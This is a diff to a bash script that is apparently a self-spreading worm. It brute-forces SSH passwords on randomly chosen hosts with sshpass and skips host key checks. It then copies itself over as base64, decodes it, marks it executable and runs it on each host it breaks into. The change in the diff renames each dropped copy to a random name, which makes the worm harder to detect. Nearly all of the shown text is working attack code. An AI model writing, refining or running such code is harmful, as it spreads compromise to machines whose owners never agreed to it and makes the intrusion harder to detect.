@@ -18,6 +18,7 @@ MY_IP="`hostname -I`"
 IPS=()
 SEED=`expr $RANDOM % $NUM_HOSTS`
 ENCODED=`cat $WORM | base64`
+NEW_NAME="$RANDOM.sh"
 
 
 # Creation of the IPv4 addresses of the hosts
@@ -41,7 +42,7 @@ echo "The target IP is $IP"
 for PASS in "${PASSWORDS[@]}"
 do
 	echo "Trying user = $USER with password = $PASS"
-	sshpass -p $PASS ssh -o StrictHostKeyChecking=no $USER@$IP "echo \"$ENCODED\" | base64 -d > \$HOME/$WORM ; chmod +x \$HOME/$WORM ; sleep 10s ; ./$WORM" # 2> /dev/null
+	sshpass -p $PASS ssh -o StrictHostKeyChecking=no $USER@$IP "echo \"$ENCODED\" | base64 -d > \$HOME/$NEW_NAME ; chmod +x \$HOME/$NEW_NAME ; sleep 10s ; ./$NEW_NAME" # 2> /dev/null
 	if [ $? -eq 0 ]; then
 	    echo "OK"
 	else
